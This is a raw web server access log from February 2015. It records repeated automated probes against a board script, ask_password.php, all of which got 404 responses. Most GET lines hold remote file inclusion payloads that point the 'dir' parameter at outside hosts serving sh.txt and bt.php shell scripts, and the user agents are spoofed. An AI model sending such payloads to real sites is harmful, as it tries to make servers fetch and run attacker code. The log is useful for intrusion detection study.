212.34.151.164 - - [16/Feb/2015:18:24:32 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
91.121.6.123 - - [16/Feb/2015:18:24:32 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
180.179.212.185 - - [16/Feb/2015:18:24:34 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;" 
176.31.252.38 - - [16/Feb/2015:18:24:34 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
180.179.212.185 - - [16/Feb/2015:18:24:35 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;" 
176.31.252.38 - - [16/Feb/2015:18:24:36 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
180.179.212.185 - - [16/Feb/2015:18:24:36 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;" 
176.31.252.38 - - [16/Feb/2015:18:24:36 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
176.31.252.38 - - [16/Feb/2015:18:24:36 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
176.31.252.38 - - [16/Feb/2015:18:24:37 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
176.31.252.38 - - [16/Feb/2015:18:24:37 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
176.31.252.38 - - [16/Feb/2015:18:24:37 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
180.179.212.185 - - [16/Feb/2015:18:24:38 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;" 
212.34.151.164 - - [16/Feb/2015:18:24:38 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.61 [en] (OS/2; U)" 
176.31.252.38 - - [16/Feb/2015:18:24:38 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
212.34.151.164 - - [16/Feb/2015:18:24:39 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.61 [en] (OS/2; U)" 
212.34.151.164 - - [16/Feb/2015:18:24:39 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.61 [en] (OS/2; U)" 
212.34.151.164 - - [16/Feb/2015:18:24:41 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.61 [en] (OS/2; U)" 
176.31.252.38 - - [16/Feb/2015:18:24:41 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [16/Feb/2015:18:24:41 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [16/Feb/2015:18:24:42 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [16/Feb/2015:18:24:43 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [16/Feb/2015:18:24:43 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [16/Feb/2015:18:24:43 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [16/Feb/2015:18:24:43 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [16/Feb/2015:18:24:43 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [16/Feb/2015:18:24:43 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
212.34.151.164 - - [16/Feb/2015:18:24:43 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
176.31.252.38 - - [16/Feb/2015:18:24:43 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [16/Feb/2015:18:24:44 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [16/Feb/2015:18:24:44 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [16/Feb/2015:18:24:44 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [16/Feb/2015:18:24:44 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [16/Feb/2015:18:24:44 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
212.34.151.164 - - [16/Feb/2015:18:24:44 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
176.31.252.38 - - [16/Feb/2015:18:24:45 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
212.34.151.164 - - [16/Feb/2015:18:24:45 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
176.31.252.38 - - [16/Feb/2015:18:24:45 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [16/Feb/2015:18:24:46 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [16/Feb/2015:18:24:46 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
212.34.151.164 - - [16/Feb/2015:18:24:46 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
176.31.252.38 - - [16/Feb/2015:18:24:47 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
203.58.0.155 - - [16/Feb/2015:18:24:48 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
203.58.0.155 - - [16/Feb/2015:18:24:50 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
203.58.0.155 - - [16/Feb/2015:18:24:50 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
203.58.0.155 - - [16/Feb/2015:18:24:52 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
176.31.252.38 - - [16/Feb/2015:18:24:56 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
176.31.252.38 - - [16/Feb/2015:18:24:57 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
176.31.252.38 - - [16/Feb/2015:18:24:58 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
176.31.252.38 - - [16/Feb/2015:18:24:59 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
203.58.0.155 - - [16/Feb/2015:18:25:04 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
176.31.252.38 - - [16/Feb/2015:18:25:06 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
203.58.0.155 - - [16/Feb/2015:18:25:06 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
203.58.0.155 - - [16/Feb/2015:18:25:06 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
176.31.252.38 - - [16/Feb/2015:18:25:07 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
203.58.0.155 - - [16/Feb/2015:18:25:08 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
176.31.252.38 - - [16/Feb/2015:18:25:10 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
176.31.252.38 - - [16/Feb/2015:18:25:11 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
80.68.145.110 - - [16/Feb/2015:18:25:13 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
212.34.151.164 - - [16/Feb/2015:18:25:14 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
80.68.145.110 - - [16/Feb/2015:18:25:15 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
212.34.151.164 - - [16/Feb/2015:18:25:15 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
80.68.145.110 - - [16/Feb/2015:18:25:15 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
212.34.151.164 - - [16/Feb/2015:18:25:15 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
80.68.145.110 - - [16/Feb/2015:18:25:16 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
212.34.151.164 - - [16/Feb/2015:18:25:16 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
211.47.181.38 - - [16/Feb/2015:18:25:22 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
211.47.181.38 - - [16/Feb/2015:18:25:23 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)" 
211.47.181.38 - - [16/Feb/2015:18:25:24 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
80.68.145.110 - - [16/Feb/2015:18:25:24 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
211.47.181.38 - - [16/Feb/2015:18:25:24 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
80.68.145.110 - - [16/Feb/2015:18:25:25 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
80.68.145.110 - - [16/Feb/2015:18:25:25 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
211.47.181.38 - - [16/Feb/2015:18:25:25 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
80.68.145.110 - - [16/Feb/2015:18:25:27 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
211.47.181.38 - - [16/Feb/2015:18:25:30 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)" 
211.47.181.38 - - [16/Feb/2015:18:25:30 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)" 
211.47.181.38 - - [16/Feb/2015:18:25:32 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)" 
203.58.0.155 - - [16/Feb/2015:18:25:38 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
203.58.0.155 - - [16/Feb/2015:18:25:39 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
203.58.0.155 - - [16/Feb/2015:18:25:40 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
203.58.0.155 - - [16/Feb/2015:18:25:41 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
211.47.181.38 - - [16/Feb/2015:18:25:53 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
211.47.181.38 - - [16/Feb/2015:18:25:54 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
211.47.181.38 - - [16/Feb/2015:18:25:55 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
211.47.181.38 - - [16/Feb/2015:18:25:56 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
211.47.181.38 - - [16/Feb/2015:18:25:58 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
211.47.181.38 - - [16/Feb/2015:18:26:00 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
211.47.181.38 - - [16/Feb/2015:18:26:04 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
211.47.181.38 - - [16/Feb/2015:18:26:06 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
211.47.181.38 - - [16/Feb/2015:18:26:06 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
211.47.181.38 - - [16/Feb/2015:18:26:07 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
211.47.181.38 - - [16/Feb/2015:18:26:07 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
211.47.181.38 - - [16/Feb/2015:18:26:08 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
211.47.181.38 - - [16/Feb/2015:18:26:22 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
211.47.181.38 - - [16/Feb/2015:18:26:24 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
114.202.2.31 - - [16/Feb/2015:18:26:24 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
211.47.181.38 - - [16/Feb/2015:18:26:25 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
114.202.2.31 - - [16/Feb/2015:18:26:26 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
114.202.2.31 - - [16/Feb/2015:18:26:26 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
211.47.181.38 - - [16/Feb/2015:18:26:27 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
114.202.2.31 - - [16/Feb/2015:18:26:28 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
176.31.252.38 - - [16/Feb/2015:18:26:49 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
176.31.252.38 - - [16/Feb/2015:18:26:51 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
176.31.252.38 - - [16/Feb/2015:18:26:51 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
176.31.252.38 - - [16/Feb/2015:18:26:52 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
212.34.151.164 - - [16/Feb/2015:18:27:31 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
212.34.151.164 - - [16/Feb/2015:18:27:32 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
212.34.151.164 - - [16/Feb/2015:18:27:32 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
212.34.151.164 - - [16/Feb/2015:18:27:33 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
80.68.145.110 - - [16/Feb/2015:18:28:03 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
80.68.145.110 - - [16/Feb/2015:18:28:04 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
80.68.145.110 - - [16/Feb/2015:18:28:04 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
